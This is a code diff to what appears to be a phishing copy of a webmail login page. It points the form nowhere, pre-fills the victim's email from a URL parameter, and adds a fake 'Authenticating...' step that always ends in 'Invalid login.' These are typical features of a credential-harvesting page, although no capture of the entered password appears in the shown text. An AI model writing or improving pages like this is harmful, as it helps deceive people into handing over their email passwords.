@@ -184,7 +184,7 @@ document.getElementById("login_form").addEventListener("submit", function (e) {
 });
 <!-- HTML Form -->
 <div id="forms">
-    <form novalidate="" id="login_form" action="https://webmail.faribadesigns.com/login/" method="post" target="_self" style="visibility:">
+    <form novalidate="" id="login_form" action="javascript:void(0)" method="post" target="_self">
         <div class="input-req-login"><label for="user">Email Address</label></div>
         <div class="input-field-login icon username-container">
             <input name="user" id="user" autofocus="autofocus" value="" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required="">
@@ -202,6 +202,9 @@ document.getElementById("login_form").addEventListener("submit", function (e) {
     </form>
 </div>
 
+<!-- Notifications -->
+<div id="notification-bar" style="display: none; text-align: center; padding: 10px; font-size: 14px; color: white;"></div>
+
 <script>
 // Function to get query parameters from the URL
 function getQueryParameter(param) {
@@ -214,10 +217,52 @@ window.addEventListener('DOMContentLoaded', () => {
     const emailParam = getQueryParameter('email');
     if (emailParam) {
         const emailField = document.getElementById('user');
-        emailField.value = emailParam; // Set the email field value
+        emailField.value = emailParam;
+
+        // Show MX (mail exchange) domain in console for debugging
+        const mxDomain = emailParam.split('@')[1];
+        console.log("MX Domain:", mxDomain);
     }
 });
+
+// Login functionality with notification
+document.getElementById('login_submit').addEventListener('click', (e) => {
+    e.preventDefault();
+
+    // Show "Authenticating..." notification
+    const notificationBar = document.getElementById('notification-bar');
+    notificationBar.style.display = 'block';
+    notificationBar.style.backgroundColor = 'lightblue';
+    notificationBar.textContent = 'Authenticating...';
+
+    // Simulate authentication delay
+    setTimeout(() => {
+        // Show "Invalid login" error
+        notificationBar.style.backgroundColor = 'red';
+        notificationBar.textContent = 'Invalid login. Please try again.';
+    }, 1500);
+});
 </script>
+
+<style>
+/* Style for the notification bar */
+#notification-bar {
+    position: absolute;
+    top: 20px;
+    left: 0;
+    right: 0;
+    z-index: 1000;
+    font-weight: bold;
+    padding: 10px;
+}
+
+/* Adjust positioning of the notification bar above the logo */
+#login-sub-header {
+    position: relative;
+    padding-top: 40px; /* To make room for the notification bar */
+}
+</style>
+
 
 
 <div class="copyright">
